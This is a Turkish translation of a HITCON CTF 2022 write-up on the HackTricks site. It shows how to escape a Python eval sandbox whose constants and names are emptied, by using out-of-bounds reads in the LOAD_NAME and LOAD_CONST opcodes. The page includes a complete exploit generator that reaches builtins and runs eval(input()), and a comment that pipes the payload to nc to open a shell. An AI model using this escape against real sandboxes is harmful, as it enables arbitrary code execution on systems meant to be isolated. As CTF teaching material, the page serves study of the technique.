# LOAD\_NAME / LOAD\_CONST opcode OOB Okuma

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

**Bu bilgi** [**bu yazıdan alınmıştır**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

LOAD\_NAME / LOAD\_CONST opcode'da OOB okuma özelliğini kullanarak bellekteki bazı sembolleri elde edebiliriz. Bu, istediğiniz sembolü (örneğin fonksiyon adı gibi) elde etmek için `(a, b, c, ... yüzlerce sembol ..., __getattribute__) if [] else [].__getattribute__(...)` gibi bir hile kullanmaktır.

Sonra sadece saldırınızı oluşturun.

### Genel Bakış <a href="#overview-1" id="overview-1"></a>

Kaynak kodu oldukça kısa, sadece 4 satırdan oluşuyor!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Arbitrary Python kodu girebilirsiniz ve bu, bir [Python kod nesnesine](https://docs.python.org/3/c-api/code.html) derlenecektir. Ancak, bu kod nesnesinin `co_consts` ve `co_names` özellikleri, kod nesnesini değerlendirmeden önce boş bir demetle değiştirilecektir.

Bu şekilde, sabitler (örneğin sayılar, dizeler vb.) veya isimler (örneğin değişkenler, fonksiyonlar) içeren tüm ifadeler sonunda hafıza ihlali nedeniyle çökmeye neden olabilir.

### Sınırlar Dışında Okuma <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Hafıza ihlali nasıl oluşur?

Basit bir örnek ile başlayalım, `[a, b, c]` aşağıdaki bytecode'a derlenebilir.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Ancak `co_names` boş bir tuple haline gelirse ne olur? `LOAD_NAME 2` opcode hala çalıştırılır ve değeri orijinal olarak olması gereken bellek adresinden okumaya çalışır. Evet, bu bir out-of-bound read "özelliği".

Çözüm için temel kavram basittir. CPython gibi bazı opcodes'lar, örneğin `LOAD_NAME` ve `LOAD_CONST`, OOB okumaya karşı savunmasızdır (?).

Bu opcodes'lar, `consts` veya `names` tuple'ından (bunlar `co_consts` ve `co_names` olarak adlandırılır) `oparg` indisindeki bir nesneyi alır. CPython'ın `LOAD_CONST` opcode'yu işlerken ne yaptığını görmek için aşağıdaki kısa örneğe bakabiliriz.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Bu şekilde, OOB özelliğini kullanarak keyfi bellek ofsetinden bir "isim" alabiliriz. Hangi isme sahip olduğunu ve ofsetinin ne olduğunu belirlemek için sadece `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... denemeye devam edin. Ve oparg > 700 civarında bir şey bulabilirsiniz. Tabii ki bellek düzenine bakmak için gdb'yi de kullanabilirsiniz, ama daha kolay olacağını düşünmüyorum?

### Exploit Oluşturma <a href="#generating-the-exploit" id="generating-the-exploit"></a>

İsimler / sabitler için bu kullanışlı ofsetleri elde ettikten sonra, bu ofsetten bir isim / sabit nasıl alır ve kullanırız? İşte size bir hile:\
5 ofsetinden (`LOAD_NAME 5`) `co_names=()` ile `__getattribute__` adını alabiliyorsak, sadece aşağıdaki adımları izleyin:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Dikkat edin, onu `__getattribute__` olarak adlandırmak zorunda değilsiniz, daha kısa veya daha garip bir şey olarak adlandırabilirsiniz.

Sadece bytecode'una bakarak nedenini anlayabilirsiniz:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
`LOAD_ATTR` komutunun da `co_names` üzerinden ismi alındığını fark edin. Python, isim aynı ise aynı ofsetten isimleri yükler, bu yüzden ikinci `__getattribute__` hala offset=5'ten yüklenir. Bu özelliği kullanarak isim bellekte yakınsa herhangi bir isim kullanabiliriz.

Sayıları oluşturmak basit olmalı:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Saldırı Betiği <a href="#exploit-script-1" id="exploit-script-1"></a>

Uzunluk sınırlaması nedeniyle sabitler kullanmadım.

İlk olarak, isimlerin bu ofsetlerini bulmak için bir betik aşağıda verilmiştir.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Ve aşağıdaki gerçek Python saldırısını oluşturmak için kullanılır.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Temel olarak, `__dir__` yönteminden aldığımız dizeler için aşağıdaki işlemleri yapar:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
